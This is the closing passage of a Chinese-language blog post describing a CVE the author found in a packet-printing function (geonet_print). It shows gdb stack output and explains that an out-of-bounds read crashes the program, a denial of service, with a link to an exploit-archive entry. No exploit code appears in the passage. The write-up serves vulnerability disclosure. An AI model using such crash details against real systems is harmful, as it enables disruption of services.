0020| 0xbfffe194 --&gt; 0xb7fe98c2 (&lt;_dl_fixup+194&gt;:    mov    edi,eax)
0024| 0xbfffe198 --&gt; 0xb7fffad0 --&gt; 0xb7fffa74 --&gt; 0xb7ffd308 --&gt; 0xb7fff918 --&gt; 0x0 
0028| 0xbfffe19c --&gt; 0x707d340 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0806f7cc in geonet_print ()
</code></pre><p>然后就拼命输出了，最后读取到了不可读的内存造成了拒绝服务</p>
<p>整个触发过程就是上面这些</p>
<p>今天收获了人生的第一波CVE，和李神探一起发现的，李神探炒鸡棒棒~~~</p>
<p>开心了一整天:)</p>
<h2 id="reference">Reference</h2>
<ul>
<li><a href="http://www.expku.com/dos/4386.html">http://www.expku.com/dos/4386.html</a></li></ul>

</body>
</html>
<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
